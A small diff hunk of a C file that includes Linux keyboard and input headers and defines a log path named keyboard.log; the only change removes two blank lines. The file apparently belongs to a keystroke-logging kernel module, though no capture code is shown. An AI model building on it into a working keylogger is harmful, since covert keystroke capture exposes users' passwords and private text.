@@ -4,8 +4,6 @@
 
 #include <linux/keyboard.h>
 #include <linux/input.h>
-
-
 #include <linux/file.h>
 
 #define LOG_PATH			"/home/tali/keyboard.log"
